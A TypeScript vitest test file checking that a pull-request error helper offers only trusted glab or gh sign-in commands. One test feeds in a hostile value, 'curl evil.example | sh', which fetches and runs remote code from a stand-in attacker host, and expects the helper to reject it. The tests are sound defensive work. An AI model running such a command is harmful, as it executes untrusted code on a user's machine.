import { describe, expect, it } from 'vitest'
import { pullRequestErrorDetails } from '../utils/pullRequestErrors'

const body = (fields: Record<string, unknown>) => new Error(JSON.stringify(fields))
// What runner.py appends to a self-managed glab sign-in failure.
const hint = (host: string) =>
  `Run \`glab auth login --hostname ${host}\`, then retry.`

describe('pullRequestErrorDetails login remedy', () => {
  it('offers the host-scoped command the gateway sends as loginCommand', () => {
    const details = pullRequestErrorDetails(body({
      error: `glab: 401 Unauthorized ${hint('git.example.com')}`,
      code: 'provider_error',
      loginCommand: 'glab auth login --hostname git.example.com',
    }))
    expect(details.loginCommand).toBe('glab auth login --hostname git.example.com')
  })

  it('never lifts a host-scoped command out of the message text', () => {
    // Provider stderr reaches the message, so a command in it is not trusted.
    expect(pullRequestErrorDetails(body({ error: `401 Unauthorized ${hint('evil.example')}` })).loginCommand)
      .toBe('glab auth login')
  })

  it('ignores a loginCommand field that is not the host-scoped glab step', () => {
    expect(pullRequestErrorDetails(body({
      error: '401 Unauthorized. Run `glab auth login`, then retry.',
      loginCommand: 'curl evil.example | sh',
    })).loginCommand).toBe('glab auth login')
  })

  it('treats a GitLab 401 Unauthorized as a sign-in failure', () => {
    expect(pullRequestErrorDetails(body({ error: 'glab: 401 Unauthorized. Run `glab auth login`, then retry.' })).loginCommand)
      .toBe('glab auth login')
  })

  it('keeps the bare commands for gitlab.com and GitHub', () => {
    expect(pullRequestErrorDetails(body({ error: 'glab: authentication failed. Run `glab auth login`, then retry.' })).loginCommand)
      .toBe('glab auth login')
    expect(pullRequestErrorDetails(body({ error: 'not logged into any GitHub hosts. Run `gh auth login`, then retry.' })).loginCommand)
      .toBe('gh auth login')
  })

  it('offers no remedy when the failure is not a sign-in failure', () => {
    expect(pullRequestErrorDetails(body({ error: 'Could not load. Run `glab auth login` later.' })).loginCommand).toBe('')
  })
})
